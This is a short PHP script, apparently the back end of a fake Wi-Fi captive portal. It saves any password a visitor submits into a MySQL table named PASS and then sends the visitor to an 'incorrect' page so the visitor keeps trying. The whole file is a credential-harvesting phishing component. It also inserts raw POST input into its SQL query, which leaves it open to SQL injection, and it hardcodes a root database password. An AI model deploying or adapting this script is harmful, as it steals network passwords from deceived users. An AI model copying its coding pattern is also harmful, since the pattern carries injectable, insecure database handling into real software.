<?php
session_start();
ob_start();
$host="localhost";
$username="root";
$pass="1616";
$dbname="CAPTIVE";
$tbl_name="PASS";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}


$password1=$_POST['wifi-password'];

$sql = "INSERT INTO PASS (PASSWORD) VALUES ('$password1')";
if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

mysqli_close($conn);

sleep(2);
header("location:incorrect.html");
ob_end_flush();
?>

